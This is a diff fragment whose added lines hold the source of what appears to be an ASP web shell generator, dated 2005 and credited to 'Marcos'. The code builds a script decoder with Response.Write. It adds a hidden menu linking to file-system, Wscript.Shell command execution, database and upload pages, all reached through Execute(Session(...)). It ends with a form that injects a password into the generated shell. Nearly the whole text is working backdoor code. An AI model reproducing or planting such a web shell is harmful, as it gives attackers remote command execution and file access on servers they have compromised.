+Response.Write "var encodingLength=unEncodinglength=0" &amp; vbNewLine
+Response.Write "var state=STATE_COPY_INPUT" &amp; vbNewLine
+Response.Write "var unEncodingString=""""" &amp; vbNewLine
+Response.Write "var re,arr" &amp; vbNewLine
+Response.Write "while(state){" &amp; vbNewLine
+Response.Write "switch (state){" &amp; vbNewLine
+Response.Write "case (STATE_COPY_INPUT):" &amp; vbNewLine
+Response.Write "scriptIndex=encodingString.indexOf(marker,stringIndex)" &amp; vbNewLine
+Response.Write "if (scriptIndex!=-1){" &amp; vbNewLine
+Response.Write "unEncodingString+=encodingString.substring(stringIndex,scriptIndex)" &amp; vbNewLine
+Response.Write "scriptIndex+=marker.length" &amp; vbNewLine
+Response.Write "state=STATE_READLEN" &amp; vbNewLine
+Response.Write "}else{" &amp; vbNewLine
+Response.Write "stringIndex=stringIndex==0?0:stringIndex" &amp; vbNewLine
+Response.Write "unEncodingString+=encodingString.substr(stringIndex,encodingString.length)" &amp; vbNewLine
+Response.Write "state=0" &amp; vbNewLine
+Response.Write "}" &amp; vbNewLine
+Response.Write "break" &amp; vbNewLine
+Response.Write "case (STATE_READLEN):" &amp; vbNewLine
+Response.Write "encodingLength=encodingString.substr(scriptIndex,6)" &amp; vbNewLine
+Response.Write "unEncodinglength=decodeBase64(encodingLength)" &amp; vbNewLine
+Response.Write "scriptIndex+=(6+""=="".length)" &amp; vbNewLine
+Response.Write "state=STATE_DECODE" &amp; vbNewLine
+Response.Write "break" &amp; vbNewLine
+Response.Write "case (STATE_DECODE):" &amp; vbNewLine
+Response.Write "if (!unEncodinglength){" &amp; vbNewLine
+Response.Write "stringIndex=scriptIndex+""DQgAAA==^#~@"".length" &amp; vbNewLine
+Response.Write "unEncodingIndex=0" &amp; vbNewLine
+Response.Write "state=STATE_COPY_INPUT" &amp; vbNewLine
+Response.Write "break" &amp; vbNewLine
+Response.Write "}" &amp; vbNewLine
+Response.Write "char=encodingString.substr(scriptIndex,1)" &amp; vbNewLine
+Response.Write "if (char==""@"") state=STATE_UNESCAPE" &amp; vbNewLine
+Response.Write "else{" &amp; vbNewLine
+Response.Write "if (char.charCodeAt(0)&lt;0xFF){" &amp; vbNewLine
+Response.Write "unEncodingString+=String.fromCharCode(transformed[pick_encoding[unEncodingIndex%64]][char.charCodeAt(0)])" &amp; vbNewLine
+Response.Write "unEncodingIndex++" &amp; vbNewLine
+Response.Write "}else{" &amp; vbNewLine
+Response.Write "unEncodingString+=char" &amp; vbNewLine
+Response.Write "}" &amp; vbNewLine
+Response.Write "scriptIndex++" &amp; vbNewLine
+Response.Write "unEncodinglength--" &amp; vbNewLine
+Response.Write "break" &amp; vbNewLine
+Response.Write "}" &amp; vbNewLine
+Response.Write "case STATE_UNESCAPE:" &amp; vbNewLine
+Response.Write "unEncodingString+=unescape2(encodingString.substr(++scriptIndex,1))" &amp; vbNewLine
+Response.Write "scriptIndex++; unEncodinglength -=2" &amp; vbNewLine
+Response.Write "unEncodingIndex++" &amp; vbNewLine
+Response.Write "state=STATE_DECODE" &amp; vbNewLine
+Response.Write "break" &amp; vbNewLine
+Response.Write "}" &amp; vbNewLine
+Response.Write "}" &amp; vbNewLine
+Response.Write "re=new RegExp(""(JScript|VBscript).encode"",""gmi"")" &amp; vbNewLine
+Response.Write "while(arr=re.exec(unEncodingString)) unEncodingString=RegExp.leftContext+RegExp.$1+RegExp.rightContext" &amp; vbNewLine
+Response.Write "return unEncodingString" &amp; vbNewLine
+Response.Write "}" &amp; vbNewLine
+Response.Write "&lt;/script>" &amp; vbNewLine
+	end sub
+	
+	sub showMenu()
+		if pageName="" or pageName="default" or pageName="login" then
+			exit sub
+		end if
+		echo "&lt;div style=""display:none;"" id=""menu"" align=""center"">"
+		echo "&lt;a href=""?{$TheSharp}=Execute(Session(%22{$TheSharp}%22))&amp;pageName=server"">〖Server〗&lt;/a>&lt;a href=""?{$TheSharp}=Execute(Session(%22{$TheSharp}%22))&amp;pageName=stream"">〖Stream〗&lt;/a>"
+		echo "&lt;a href=""?{$TheSharp}=Execute(Session(%22{$TheSharp}%22))&amp;pageName=fso"">〖FSO〗&lt;/a>&lt;a href=""?{$TheSharp}=Execute(Session(%22{$TheSharp}%22))&amp;pageName=cmdShell"">〖Wscript.Shell〗&lt;/a>"
+		echo "&lt;a href=""?{$TheSharp}=Execute(Session(%22{$TheSharp}%22))&amp;pageName=app"">〖Application〗&lt;/a>"
+		echo "&lt;a href=""?{$TheSharp}=Execute(Session(%22{$TheSharp}%22))&amp;pageName=sql"">〖MS DataBase〗&lt;/a>&lt;a href=""?{$TheSharp}=Execute(Session(%22{$TheSharp}%22))&amp;pageName=upload"">〖Other〗&lt;/a>"
+		echo "&lt;br>&lt;br>&lt;/div>"
+		echo "&lt;script language=""JavaScript"">showMenu();&lt;/script>"
+	end sub
+Response.Write "&lt;meta http-equiv=""Content-Type"" content=""text/html; charset=gb2312"">" &amp; vbNewLine
+</textarea></td></tr><tr><td align="center" class="td"> <input type="submit" name="Submit3" value="提 交" onClick="ss = '{$ThePass}';o=document.forms[0].fileContent;s=o.value;s=s.replace(/{\$TheSharp}/g, escape(ss));o.value=s;document.forms[0].action=document.forms[0].theAction.value;"> <input type="reset" name="Submit32" value="重 置"></td></tr><tr><td class="trHead">&nbsp;</td></tr><tr> <td height="22" align="right" class="td">Powered By <a href="javascript:;" title="QQ:26696782
+http://hididi.net">Marcos</a> 2005.11&nbsp;</td></tr></form></table></body></html>
